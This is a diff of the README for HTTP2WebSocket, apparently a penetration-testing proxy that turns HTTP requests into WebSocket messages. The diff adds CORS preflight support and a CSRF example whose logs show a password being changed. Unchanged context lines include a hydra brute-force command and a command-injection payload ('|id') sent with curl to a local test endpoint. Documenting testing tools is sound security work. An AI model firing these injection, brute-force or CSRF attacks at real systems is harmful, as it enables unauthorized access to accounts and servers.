@@ -22,10 +22,15 @@ pip3 install request websocket-client
 No installation is required.
 
 ## Usage
-HTTP2WebSocket act as a proxy between HTTP and Web Socket connection. It expects HTTP incomming traffic and translates it to Web Socket application.<br>
-GET method is used to discover endpoinds.<br>
-POST method is used to sent data to a web socket application.<br>
-HTTP2WebSocket can work in two ways. The default one is passing the exact HTTP body to the web socket. The second one is passing only the value of the parameter provided.<br>
+- HTTP2WebSocket act as a proxy between HTTP and Web Socket connection. It expects HTTP incomming traffic and translates it to Web Socket application
+- GET method is used to discover endpoinds
+- POST method is used to sent data to a web socket application
+- OPTIONS method to support CORS preflight request, necessary to XMLHttpRequest object
+
+HTTP2WebSocket can work in two ways:
+1. The default one is passing the exact HTTP body to the web socket
+2. The second one is passing only the value of the parameter provided.<br>
+
 HTTP2WebSocket can be binded to a specific application (-t parameter) or it can be provided in each HTTP request through Host header.
 
 ## Examples
@@ -48,6 +53,19 @@ hydra -t 1 -L dict-passwords.b64 -P dict-passwords.b64 -s 3333 127.0.0.1 http-fo
 Command execution:
 ```bash
 curl "http://127.0.0.1:3333/command-execution" -d '|id'
+```
+
+CSRF<br>
+Once logged in open the provided [HTML template](csrf_tmp.html), then check the response
+```
+HTTP2WebSocket started listening on port: 3333
+127.0.0.1 - - [17/May/2024 16:25:30] "OPTIONS /change-password HTTP/1.1" 200 -
+127.0.0.1 - - [17/May/2024 16:25:31] "POST /change-password HTTP/1.1" 200 -
+ |- RESPONSE --------> Authenticated session is required for changing password.
+
+127.0.0.1 - - [17/May/2024 16:27:27] "OPTIONS /change-password HTTP/1.1" 200 -
+127.0.0.1 - - [17/May/2024 16:27:28] "POST /change-password HTTP/1.1" 200 -
+ |- RESPONSE --------> Password changed successfully.
 ```
 
 File inclusion:
